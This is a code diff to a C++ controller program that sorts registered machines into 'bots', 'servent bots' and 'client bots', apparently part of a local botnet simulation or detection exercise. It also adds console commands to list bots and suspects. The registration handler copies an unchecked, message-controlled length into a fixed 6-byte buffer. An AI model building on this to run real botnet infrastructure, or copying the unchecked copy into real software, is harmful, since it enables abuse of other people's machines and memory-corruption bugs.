@@ -35,7 +35,9 @@ ostringstream calculate_time(char *);
 
 
 vector<char *> suspect;
-vector<char *> host;
+vector<char *> serventBot;
+vector<char *> clientBot;
+vector<char *> bot;
 _socketserver *listenSocket;
 
 bool server_status = false;
@@ -123,8 +125,10 @@ int main(int argc, char *argv[]) {
 
     cout << "[Application] Controller Start!" << endl;
     cout << "[INSTRUCTION] Input \'L\' To Show All." << endl;
-    cout << "[INSTRUCTION] Input \'H\' To Show Hosts." << endl;
-    cout << "[INSTRUCTION] Input \'S\' To Show Suspects." << endl;
+    cout << "[INSTRUCTION] Input \'B\' To Show Bots." << endl;
+    cout << "[INSTRUCTION] Input \'S\' To Show Servent Bots." << endl;
+    cout << "[INSTRUCTION] Input \'C\' To Show Client Bots." << endl;
+    cout << "[INSTRUCTION] Input \'R\' To Show Suspects." << endl;
     cout << "[INSTRUCTION] Input \'T\' To Show Timestamp." << endl;
     cout << "[INSTRUCTION] Input \'E\' To Exit." << endl;
 
@@ -136,19 +140,33 @@ int main(int argc, char *argv[]) {
         switch (operation) {
             case 'L':
             case 'l':
-                cout << "Host Number: " << host.size() << endl;
+                cout << "Bot Number: " << bot.size() << endl;
+                cout << "Servent Bot Number: " << serventBot.size() << endl;
+                cout << "Client Bot Number: " << clientBot.size() << endl;
                 cout << "Suspect Number: " << suspect.size() << endl;
                 break;
-            case 'H':
-            case 'h':
-                for (each = host.begin(); each != host.end(); each++) {
-                    cout << "HOST => " << LOCAL_IP_ADDRESS << ":" << *each << endl;
+            case 'B':
+            case 'b':
+                for (each = bot.begin(); each != bot.end(); each++) {
+                    cout << "BOT => " << LOCAL_IP_ADDRESS << ":" << *each << endl;
                 }
                 break;
             case 'S':
             case 's':
+                for (each = serventBot.begin(); each != serventBot.end(); each++) {
+                    cout << "Servent Bot => " << LOCAL_IP_ADDRESS << ":" << *each << endl;
+                }
+                break;
+            case 'C':
+            case 'c':
+                for (each = clientBot.begin(); each != clientBot.end(); each++) {
+                    cout << "Client Bot => " << LOCAL_IP_ADDRESS << ":" << *each << endl;
+                }
+                break;
+            case 'R':
+            case 'r':
                 for (each = suspect.begin(); each != suspect.end(); each++) {
-                    cout << "SUSPECT > " << *each << endl;
+                    cout << "SUSPECT => " << *each << endl;
                 }
                 break;
             case 'T':
@@ -249,11 +267,18 @@ void messageHandle(LPVOID s) {
 
     } else if (msg_type == 'S') {
         // host Register
-        char *host_port = (char *) calloc(6, sizeof(char));
-        memcpy(host_port, &message[1], strlen(message) - 1);
-        host.push_back(host_port);
-        clientS->send_((char *) "OK");
+        char *bot_port = (char *) calloc(6, sizeof(char));
+        char bot_type = message[1];
+        memcpy(bot_port, &message[2], strlen(message) - 2);
+        if(bot_type == 'S') {
+            serventBot.push_back(bot_port);
+        }
+        else {
+            clientBot.push_back(bot_port);
+        }
 
+        bot.push_back(bot_port);
+        clientS->send_((char *) "OK");
     }
 
     clientS->close_();
